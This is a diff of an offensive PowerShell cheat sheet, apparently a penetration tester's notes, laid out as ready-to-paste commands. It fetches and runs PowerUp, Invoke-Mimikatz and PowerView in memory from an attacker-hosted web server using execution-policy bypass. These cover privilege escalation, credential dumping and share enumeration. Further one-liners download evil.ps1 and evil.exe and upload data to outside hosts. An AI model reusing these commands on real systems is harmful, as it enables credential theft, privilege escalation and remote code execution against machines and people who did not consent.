@@ -4,36 +4,36 @@ PowerShell - How To
 # Priv escalation
 
 - Load from disk
+powershell -nop -exec bypass
 Import-Module PowerUp.ps1
 Invoke-AllChecks
 
-- Load from GitHub
-"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk');Invoke-PowerUp"
-Invoke-AllChecks
-
 - Load from Kali
-cd /opt/Empire/data/module_source/privesc/
+cd /opt/PowerSploit/Privesc/
 python -m SimpleHTTPServer
 
 - Windows
-"IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/PowerUp.ps1');Invoke-PowerUp"
-Invoke-AllChecks
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.215.21:8000/PowerUp.ps1'); Invoke-AllChecks"
 ------------------------------------------------------------------------------------------------------
 
-# Dump creds
+# Dump creds (need admin privs)
 
-- Load from GitHub
-"IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
-
-- Load from Kali
-cd /opt/Empire/data/module_source/credentials/
+cd /opt/PowerSploit/Exfiltration/
 python -m SimpleHTTPServer
 
 - Windows
-"IEX (New-Object Net.WebClient).DownloadString('http://172.16.16.214:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.215.21:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
 ------------------------------------------------------------------------------------------------------
 
-# Open fileshares
+# Find open fileshares
+
+cd /opt/PowerSploit/Recon/
+python -m SimpleHTTPServer
+
+- Windows
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.215.21:8000/PowerView.ps1'); Invoke-Netview"
+??? need to test
+============================
 
 Import-Module powerview.ps1
 Invoke-ShareFinder -CheckShareAccess
@@ -44,13 +44,13 @@ Remove-PSDrive S
 ------------------------------------------------------------------------------------------------------
 
 # Download file
-IEX(New-Object System.Net.Webclient).DownloadString(‘http://10.0.0.10/evil.ps1’)
+IEX(New-Object System.Net.Webclient).DownloadString('http://10.0.0.10/evil.ps1')
 
 # Download file to disk
-IEX(New-Object System.Net.Webclient).DownloadFile(‘http://10.1.1.100/evil.exe’, ‘good.exe’)
+IEX(New-Object System.Net.Webclient).DownloadFile('http://10.1.1.100/evil.exe', 'good.exe')
 
 # Upload file
-IEX(New-Object System.Net.Webclient).UploadString(‘http://10.0.0.10/evil.ps1’,”<PostDATA>”)
+IEX(New-Object System.Net.Webclient).UploadString('http://10.0.0.10/evil.ps1',"<PostDATA>")
 ------------------------------------------------------------------------------------------------------
 
 # Who are your admins
